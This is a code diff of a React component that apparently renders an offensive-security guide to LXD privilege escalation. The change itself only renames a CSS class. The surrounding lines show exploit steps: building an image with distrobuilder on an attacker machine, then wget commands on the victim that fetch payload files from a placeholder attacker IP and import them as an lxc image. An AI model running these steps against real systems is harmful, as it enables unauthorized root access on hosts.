@@ -48,7 +48,7 @@ const LXD = ({ title }: IProps) => {
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Exploit</Typography>
             <Typography>Attacker Machine:</Typography>
-            <SyntaxHighlighter className="syntax-block" language="bash">
+            <SyntaxHighlighter className="syntax" language="bash">
               {"sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools\n" +
                 "sudo git clone https://github.com/lxc/distrobuilder\n" +
                 "cd distrobuilder\n" +
@@ -62,7 +62,7 @@ const LXD = ({ title }: IProps) => {
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Exploit</Typography>
             <Typography>Victim Machine:</Typography>
-            <SyntaxHighlighter className="syntax-block" language="bash">
+            <SyntaxHighlighter className="syntax" language="bash">
               {"wget http://{Attacker_IP}:8000/lxd.tar.xz\n" +
                 "wget http://{Attacker_IP}:8000/rootfs.squashfs\n" +
                 "lxc image import lxd.tar.xz rootfs.squashfs --alias alpine\n" +
